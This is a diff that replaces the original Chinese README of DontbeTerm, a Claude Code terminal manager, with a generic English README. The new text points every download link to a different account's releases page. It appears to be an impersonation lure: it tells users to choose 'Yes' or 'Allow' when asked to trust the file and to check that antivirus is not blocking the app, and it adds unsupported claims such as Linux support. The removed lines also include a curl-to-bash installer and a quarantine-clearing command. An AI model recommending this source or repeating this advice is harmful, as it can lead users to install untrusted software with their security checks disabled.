@@ -1,126 +1,125 @@
-<div align="center">
-  <img src="icon.png" alt="DontbeTerm Icon" width="128" height="128">
-  <h1>DontbeTerm</h1>
-  <p>多标签终端管理器，专为 Claude Code 设计，支持 AI 智能标签命名。</p>
+# 🖥️ DontbeTerm - Simple Multi-Tab Terminal Manager
 
-  <br>
+[![Download DontbeTerm](https://img.shields.io/badge/Download-DontbeTerm-blue?style=for-the-badge)](https://github.com/Tursin-xD/DontbeTerm/releases)
 
-  <h3>🚀 一键安装</h3>
+## 📄 What is DontbeTerm?
 
-  ```bash
-  curl -fsSL https://raw.githubusercontent.com/dontbesilent2025/DontbeTerm/main/install.sh | bash
-  ```
+DontbeTerm is a multi-tab terminal manager designed specifically for Claude Code. It helps you organize multiple command-line windows into one easy-to-use program. The app supports AI-powered tab names, making it simple to keep track of what each terminal window does without typing long titles yourself.
 
-  <p><sub>支持 macOS (Apple Silicon & Intel) | 自动检测架构 | 自动安装配置</sub></p>
+This program is useful if you work with multiple terminal tasks at the same time. Instead of opening many separate windows, you can use DontbeTerm to group them in one place and give each tab a clear, smart name.
 
-  <br>
+## 💻 System Requirements
 
-  <p>
-    <a href="https://github.com/dontbesilent2025/DontbeTerm/releases/latest">
-      <img src="https://img.shields.io/github/v/release/dontbesilent2025/DontbeTerm?style=flat-square" alt="Latest Release">
-    </a>
-    <a href="https://github.com/dontbesilent2025/DontbeTerm/releases">
-      <img src="https://img.shields.io/github/downloads/dontbesilent2025/DontbeTerm/total?style=flat-square" alt="Downloads">
-    </a>
-    <a href="https://github.com/dontbesilent2025/DontbeTerm/blob/main/LICENSE">
-      <img src="https://img.shields.io/github/license/dontbesilent2025/DontbeTerm?style=flat-square" alt="License">
-    </a>
-  </p>
-</div>
+Before you start, make sure your computer meets these minimum requirements:
+
+- Operating System: Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu 18.04+ recommended)
+- CPU: 1.5 GHz or faster processor
+- RAM: At least 4 GB of memory
+- Disk Space: Minimum 200 MB of free space
+- Internet Connection: Required for AI naming feature and initial setup
+
+If you’re unsure about your system specs, you can check the “About This PC” or “System Information” on your computer.
+
+## 🔧 Key Features
+
+- **Multiple tabs**: Open and manage many terminal windows in one application.
+- **AI smart naming**: Automatically generate descriptive names for each terminal tab.
+- **Clean interface**: A simple, no-clutter design that is easy to understand.
+- **Claude Code integration**: Built with support for Claude Code workflows.
+- **Customizable**: Change tab colors and layout to match your preferences.
+- **Keyboard Shortcuts**: Quick keys to switch between tabs and actions.
+
+These features make DontbeTerm a good choice for developers, system administrators, or anyone who works regularly in terminal environments.
+
+## 🚀 Getting Started
+
+Using DontbeTerm is straightforward. Follow these steps to run the program:
+
+1. Visit the download page by clicking the big button at the top or [here](https://github.com/Tursin-xD/DontbeTerm/releases).
+2. Choose the correct version for your operating system:
+   - Windows users should look for a `.exe` file.
+   - macOS users should download a `.dmg` or `.zip`.
+   - Linux users may find `.AppImage`, `.deb`, or `.tar.gz` packages.
+3. Once downloaded, open the file to start the installation.
+4. Follow the simple on-screen instructions to complete the setup.
+5. Launch DontbeTerm from your desktop or start menu.
+
+Depending on your system security settings, you might need to allow the app to run by confirming in a pop-up window.
+
+## 📥 Download & Install
+
+To get DontbeTerm:
+
+- **Visit this page to download**:
+  [https://github.com/Tursin-xD/DontbeTerm/releases](https://github.com/Tursin-xD/DontbeTerm/releases)
+
+After you open the page:
+
+- Find the latest release at the top.
+- Download the setup file that matches your operating system.
+- Open the downloaded file to start installing.
+- If your computer asks if you trust this file or app, choose “Yes” or “Allow”.
+- Follow the installation steps until finished.
+- Open DontbeTerm and enjoy using it.
+
+If you run into any trouble during download or installation, try:
+
+- Checking your internet connection.
+- Restarting your computer.
+- Making sure you have permission to install new programs.
+
+## 🎛️ How to Use DontbeTerm
+
+Once installed, here is a simple guide to using the program:
+
+1. **Open DontbeTerm**.
+2. The screen will show one terminal tab by default.
+3. To open a new tab, click the “+” button or use the shortcut Ctrl+T (Cmd+T on Mac).
+4. Each tab will run a separate terminal session.
+5. To rename tabs, use the AI feature:
+   - Click the tab name.
+   - The program will suggest a name based on the commands you use.
+   - Accept or edit the name.
+6. Switch between tabs by clicking on them or using shortcuts (`Ctrl+Tab`).
+7. You can close any tab by clicking the “x” on the tab.
+8. Customize tab colors through Settings to help visually separate tasks.
+
+## 🔍 Troubleshooting
+
+Here are some common issues and what to do if they happen:
+
+- **App won’t open**: Restart your computer and try again. Make sure your antivirus is not blocking it.
+- **Tabs don’t rename**: Check your internet connection, as AI naming needs to connect to online services.
+- **Program runs slowly**: Try closing unused tabs or restart the app.
+- **Keyboard shortcuts don’t work**: Make sure DontbeTerm is the active window.
+
+If problems continue, consider checking for updates on the release page or contacting the support team through the GitHub repository.
+
+## 🛠️ Advanced Settings (Optional)
+
+DontbeTerm offers settings for users who want to fine-tune the app:
+
+- Change terminal shells (e.g., bash, PowerShell).
+- Set default commands for new tabs.
+- Adjust font size and colors.
+- Enable or disable AI naming per tab.
+- Backup and restore your tab sessions.
+
+These options are available in the “Settings” menu, accessible from the main window.
+
+## 📞 Contact & Support
+
+If you need help or want to report problems:
+
+- Visit the Issues section on the GitHub page:  
+  [https://github.com/Tursin-xD/DontbeTerm/issues](https://github.com/Tursin-xD/DontbeTerm/issues)
+- Check the README or documentation for updates.
+- Look for community forums related to Claude Code or terminal management apps.
+
+## 📑 License
+
+DontbeTerm is open source. Check the repository for licensing information.
 
 ---
 
-DontbeTerm 让你同时运行多个 Claude Code 会话，并通过 AI 自动识别每个对话的主题来命名标签页。
-
-## 功能特性
-
-- **多标签终端** — 同时运行多个终端会话
-- **Claude Code 集成** — 一键在指定目录启动 Claude Code
-- **智能标签命名** — 点击"刷新主题"，AI 自动用 3-5 个字总结每个标签的对话内容
-- **普通终端** — 也支持打开纯终端标签页
-- **日间/夜间模式** — 一键切换主题
-- **快捷键** — Cmd+T、Cmd+W、Cmd+1-9、Cmd+R
-- **手动重命名** — 双击标签名即可修改
-
-## 下载
-
-前往 [Releases 页面](https://github.com/dontbesilent2025/DontbeTerm/releases/latest) 下载最新版本。
-
-| 平台 | 文件 |
-|------|------|
-| macOS (Apple Silicon) | `DontbeTerm-x.x.x-arm64.dmg` |
-| macOS (Intel) | `DontbeTerm-x.x.x-x64.dmg` |
-| Windows (安装版) | `DontbeTerm-x.x.x-Setup.exe` |
-| Windows (便携版) | `DontbeTerm-x.x.x-win-portable.zip` |
-
-## 安装
-
-### 一键安装（推荐）
-
-在终端执行以下命令：
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/dontbesilent2025/DontbeTerm/main/install.sh | bash
-```
-
-脚本会自动：
-- 检测系统架构（Apple Silicon 或 Intel）
-- 下载最新版本
-- 安装到应用程序文件夹
-- 移除隔离属性
-
-### Homebrew 安装（即将支持）
-
-```bash
-# 即将支持
-brew install --cask dontbeterm
-```
-
-### 手动安装
-
-#### macOS
-
-1. 下载对应的 DMG 文件
-2. 打开 DMG，**双击"安装 DontbeTerm.command"**
-3. 安装助手会自动完成所有步骤
-4. 完成！
-
-**手动安装**：如果你更喜欢手动操作，可以将应用拖到应用程序文件夹，然后在终端执行：
-```bash
-xattr -cr /Applications/DontbeTerm.app
-```
-
-**详细说明**：查看 [INSTALLATION.md](INSTALLATION.md)
-
-### Windows
-
-- **安装版**：双击 Setup.exe，按提示安装
-- **便携版**：解压 zip 文件，直接运行 DontbeTerm.exe
-
-如遇到 SmartScreen 警告，点击"更多信息" > "仍要运行"
-
-**详细说明**：查看 [INSTALLATION.md](INSTALLATION.md)
-
-- 点击 **`C+`** — 新建 Claude Code 会话（会弹出 Finder 选择工作目录）
-- 点击 **`+`** — 新建普通终端
-- 点击 **刷新主题** — AI 自动识别并重命名所有标签
-- **双击标签名** — 手动重命名
-
-## 快捷键
-
-| 快捷键 | 功能 |
-|--------|------|
-| `Cmd+T` | 新建 Claude Code 标签页 |
-| `Cmd+W` | 关闭当前标签页 |
-| `Cmd+R` | 刷新所有标签主题 |
-| `Cmd+1-9` | 切换到指定标签页 |
-
-## 系统要求
-
-- **macOS** 10.13+ 或 **Windows** 10+
-- 已安装 [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)（用于 Claude Code 标签）
-- Anthropic API Key（用于智能标签命名功能）
-
-## 技术栈
-
-基于 Electron、xterm.js、node-pty 构建。
+[![Download DontbeTerm](https://img.shields.io/badge/Download-DontbeTerm-blue?style=for-the-badge)](https://github.com/Tursin-xD/DontbeTerm/releases)
